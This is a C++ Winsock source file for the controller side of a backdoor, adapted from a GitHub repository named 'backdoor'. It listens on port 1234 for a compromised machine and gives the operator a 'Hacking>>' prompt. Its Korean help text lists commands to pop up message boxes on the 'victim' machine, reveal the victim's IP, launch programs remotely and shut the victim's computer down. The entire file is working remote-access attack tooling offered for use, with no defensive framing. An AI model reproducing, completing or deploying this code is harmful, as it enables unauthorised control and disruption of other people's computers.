// 참고 https://github.com/DRAGONPROCESS/backdoor

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>

#pragma comment(lib, "ws2_32")

int port = 1234;
#define PACKET_SIZE 1024

using namespace std;

int main()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET hListen;
	hListen = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN tListenAddr = {};
	tListenAddr.sin_family = AF_INET;
	tListenAddr.sin_port = htons(port);
	tListenAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	bind(hListen, (SOCKADDR*)&tListenAddr, sizeof(tListenAddr));
	listen(hListen, SOMAXCONN);

	SOCKADDR_IN tClntAddr = {};
	int iClntSize = sizeof(tClntAddr);
	SOCKET hClient = accept(hListen, (SOCKADDR*)&tClntAddr, &iClntSize);

	char cmd[PACKET_SIZE] = { 0 }, msgbox[PACKET_SIZE] = { 0 };

	//char recve[PACKET_SIZE] = { 0 };
	//recv(hListen, recve, PACKET_SIZE, 0);
	//cout << recve << endl;

	cout << "포트 : " << port << endl;

	bool first = true;
	while (!WSAGetLastError()) {
		if (first) {
			cout << inet_ntoa(tClntAddr.sin_addr) << " Connected!" << endl;
			first = false;
		}

		ZeroMemory(&cmd, PACKET_SIZE);
		ZeroMemory(&msgbox, PACKET_SIZE);
		cout << "Hacking>> ";
		cin >> cmd;
		if (!strcmp(cmd, "exit")) {
			send(hClient, cmd, strlen(cmd), 0);
			break;
		}
		else if (!strcmp(cmd, "help")) {
			cout << "| help - 도움말\n| exit - 세선종료\n| msgbox - 메세지박스출력\n| ip - 피해자의 아이피보기\n| run - 프로그램 실행\n| off - 피해자의 컴퓨터 종료\n";
		}
		else if (!strcmp(cmd, "ip")) {
			cout << "피해자의 아이피주소>> " << inet_ntoa(tClntAddr.sin_addr) << endl;
		}
		else if (!strcmp(cmd, "msgbox")) {
			send(hClient, cmd, strlen(cmd) + 1, 0);
			cout << "제목입력: ";
			cin >> msgbox;
			send(hClient, msgbox, strlen(msgbox) + 1, 0);
			cout << "내용입력: ";
			cin >> msgbox;
			send(hClient, msgbox, strlen(msgbox) + 1, 0);
		}
		else if (!strcmp(cmd, "run")) {
			send(hClient, cmd, strlen(cmd) + 1, 0);
			cout << "프로그램 이름: ";
			cin >> msgbox;
			send(hClient, msgbox, strlen(msgbox) + 1, 0);
		}
		//else if (!strcmp(cmd, "showconsole")) {
		//	send(hClient, cmd, strlen(cmd) + 1, 0);
		//	cout << "입력(true, false): ";
		//	cin >> msgbox;
		//	if (!strcmp(msgbox, "true") || !strcmp(msgbox, "false")) {
		//		send(hClient, msgbox, strlen(msgbox) + 1, 0);
		//	}
		//	else send(hClient, msgbox, strlen(msgbox) + 1, 0);
		//}
		else if (!strcmp(cmd, "off")) {
			send(hClient, cmd, strlen(cmd) + 1, 0);
		}
		else send(hClient, cmd, strlen(cmd) + 1, 0);
	}

	closesocket(hClient);
	closesocket(hListen);

	WSACleanup();
	return 0;
}